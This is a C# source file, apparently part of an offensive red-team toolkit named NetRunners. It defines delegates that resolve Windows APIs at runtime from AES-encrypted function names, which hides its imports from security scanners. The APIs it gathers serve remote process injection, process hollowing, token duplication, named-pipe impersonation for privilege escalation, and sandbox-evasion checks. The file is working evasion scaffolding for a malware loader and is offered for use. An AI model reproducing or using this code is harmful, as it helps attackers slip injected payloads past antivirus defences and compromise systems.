using System;
using System.Runtime.InteropServices;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.Structs;

namespace NetRunners.Delegates
{
    /// <summary>
    /// This class includes DLL import statements needed to call relevant win32 apis. 
    /// Some win32 apis require structures, these are retrieved from the Structures class.
    /// </summary>
    public class Delegate
    {
        // Importing Getprocaddress, getmodulehandle to dynamically resolve other APIs
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        //// PASTE DELEGATES BELOW

        //// import CONVERTSIDTOSTRINGSIDW
        public delegate bool pConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);
        public static pConvertSidToStringSidW ConvertSidToStringSidW = (pConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(ConvertSidToStringSidW_Bytes, AesKey)), typeof(pConvertSidToStringSidW));

        //// import CREATEPROCESSWITHTOKENW
        public delegate bool pCreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public static pCreateProcessWithTokenW CreateProcessWithTokenW = (pCreateProcessWithTokenW)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(CreateProcessWithTokenW_Bytes, AesKey)), typeof(pCreateProcessWithTokenW));

        //// import DUPLICATETOKENEX
        public delegate bool pDuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
        public static pDuplicateTokenEx DuplicateTokenEx = (pDuplicateTokenEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(DuplicateTokenEx_Bytes, AesKey)), typeof(pDuplicateTokenEx));

        //// import GETTOKENINFORMATION
        public delegate bool pGetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
        public static pGetTokenInformation GetTokenInformation = (pGetTokenInformation)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(GetTokenInformation_Bytes, AesKey)), typeof(pGetTokenInformation));

        //// import IMPERSONATENAMEDPIPECLIENT
        public delegate bool pImpersonateNamedPipeClient(IntPtr hNamedPipe);
        public static pImpersonateNamedPipeClient ImpersonateNamedPipeClient = (pImpersonateNamedPipeClient)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(ImpersonateNamedPipeClient_Bytes, AesKey)), typeof(pImpersonateNamedPipeClient));

        //// import OPENTHREADTOKEN
        public delegate bool pOpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
        public static pOpenThreadToken OpenThreadToken = (pOpenThreadToken)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("advapi32.dll"), DecryptBytesToStringAes(OpenThreadToken_Bytes, AesKey)), typeof(pOpenThreadToken));

        //// import CLOSEHANDLE
        public delegate bool pCloseHandle(IntPtr handle);
        public static pCloseHandle CloseHandle = (pCloseHandle)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32"), DecryptBytesToStringAes(CloseHandle_Bytes, AesKey)), typeof(pCloseHandle));

        //// import CREATEREMOTETHREAD
        public delegate IntPtr pCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateRemoteThread CreateRemoteThread = (pCreateRemoteThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateRemoteThread_Bytes, AesKey)), typeof(pCreateRemoteThread));

        //// import CREATETHREAD
        public delegate IntPtr pCreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateThread CreateThread = (pCreateThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateThread_Bytes, AesKey)), typeof(pCreateThread));

        //// import OPENTHREAD
        public delegate IntPtr pOpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        public static pOpenThread OpenThread = (pOpenThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(OpenThread_Bytes, AesKey)), typeof(pOpenThread));

        //// import PROCESS32FIRST
        public delegate int pProcess32First(IntPtr hSnapshot, ref ProcessEntry32 lppe);
        public static pProcess32First Process32First = (pProcess32First)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(Process32First_Bytes, AesKey)), typeof(pProcess32First));

        //// import PROCESS32NEXT
        public delegate int pProcess32Next(IntPtr hSnapshot, ref ProcessEntry32 lppe);
        public static pProcess32Next Process32Next = (pProcess32Next)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(Process32Next_Bytes, AesKey)), typeof(pProcess32Next));

        //// import SUSPENDTHREAD
        public delegate uint pSuspendThread(IntPtr hThread);
        public static pSuspendThread SuspendThread = (pSuspendThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(SuspendThread_Bytes, AesKey)), typeof(pSuspendThread));

        //// import CREATENAMEDPIPEW
        public delegate IntPtr pCreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
        public static pCreateNamedPipeW CreateNamedPipeW = (pCreateNamedPipeW)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateNamedPipeW_Bytes, AesKey)), typeof(pCreateNamedPipeW));

        //// import CREATETOOLHELP32SNAPSHOT
        public delegate IntPtr pCreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        public static pCreateToolhelp32Snapshot CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateToolhelp32Snapshot_Bytes, AesKey)), typeof(pCreateToolhelp32Snapshot));

        //// import GETCURRENTPROCESS
        public delegate IntPtr pGetCurrentProcess();
        public static pGetCurrentProcess GetCurrentProcess = (pGetCurrentProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(GetCurrentProcess_Bytes, AesKey)), typeof(pGetCurrentProcess));

        //// import GETCURRENTTHREAD
        public delegate IntPtr pGetCurrentThread();
        public static pGetCurrentThread GetCurrentThread = (pGetCurrentThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(GetCurrentThread_Bytes, AesKey)), typeof(pGetCurrentThread));

        //// import GETSTDHANDLE
        public delegate IntPtr pGetStdHandle(int nStdHandle);
        public static pGetStdHandle GetStdHandle = (pGetStdHandle)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(GetStdHandle_Bytes, AesKey)), typeof(pGetStdHandle));

        //// import CONNECTNAMEDPIPE
        public delegate bool pConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
        public static pConnectNamedPipe ConnectNamedPipe = (pConnectNamedPipe)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(ConnectNamedPipe_Bytes, AesKey)), typeof(pConnectNamedPipe));

        //// import CREATEPROCESSA
        public delegate int pCreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public static pCreateProcessA CreateProcessA = (pCreateProcessA)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(CreateProcessA_Bytes, AesKey)), typeof(pCreateProcessA));

        //// import READPROCESSMEMORY
        public delegate int pReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        public static pReadProcessMemory ReadProcessMemory = (pReadProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(ReadProcessMemory_Bytes, AesKey)), typeof(pReadProcessMemory));

        //// import RESUMETHREAD
        public delegate uint pResumeThread(IntPtr hThread);
        public static pResumeThread ResumeThread = (pResumeThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(ResumeThread_Bytes, AesKey)), typeof(pResumeThread));

        //// import WAITFORSINGLEOBJECT
        public delegate uint pWaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(WaitForSingleObject_Bytes, AesKey)), typeof(pWaitForSingleObject));

        //// import ISWOW64PROCESS
        public delegate bool pIsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        public static pIsWow64Process IsWow64Process = (pIsWow64Process)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(IsWow64Process_Bytes, AesKey)), typeof(pIsWow64Process));

        //// import FLSALLOC
        public delegate IntPtr pFlsAlloc(IntPtr lpCallback);
        public static pFlsAlloc FlsAlloc = (pFlsAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(FlsAlloc_Bytes, AesKey)), typeof(pFlsAlloc));

        //// import LOADLIBRARYA
        public delegate IntPtr pLoadLibraryA(string name);
        public static pLoadLibraryA LoadLibraryA = (pLoadLibraryA)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(LoadLibraryA_Bytes, AesKey)), typeof(pLoadLibraryA));

        //// import OPENPROCESS
        public delegate IntPtr pOpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);
        public static pOpenProcess OpenProcess = (pOpenProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(OpenProcess_Bytes, AesKey)), typeof(pOpenProcess));

        //// import VIRTUALALLOC
        public delegate IntPtr pVirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAlloc VirtualAlloc = (pVirtualAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAlloc_Bytes, AesKey)), typeof(pVirtualAlloc));

        //// import VIRTUALALLOCEX
        public delegate IntPtr pVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAllocEx VirtualAllocEx = (pVirtualAllocEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAllocEx_Bytes, AesKey)), typeof(pVirtualAllocEx));

        //// import VIRTUALALLOCEXNUMA
        public delegate IntPtr pVirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        public static pVirtualAllocExNuma VirtualAllocExNuma = (pVirtualAllocExNuma)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualAllocExNuma_Bytes, AesKey)), typeof(pVirtualAllocExNuma));

        //// import VIRTUALPROTECT
        public delegate int pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static pVirtualProtect VirtualProtect = (pVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualProtect_Bytes, AesKey)), typeof(pVirtualProtect));

        //// import WRITEPROCESSMEMORY
        public delegate int pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        public static pWriteProcessMemory WriteProcessMemory = (pWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(WriteProcessMemory_Bytes, AesKey)), typeof(pWriteProcessMemory));

        //// import ZWQUERYINFORMATIONPROCESS
        public delegate int pZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        public static pZwQueryInformationProcess ZwQueryInformationProcess = (pZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("ntdll.dll"), DecryptBytesToStringAes(ZwQueryInformationProcess_Bytes, AesKey)), typeof(pZwQueryInformationProcess));
    }
}
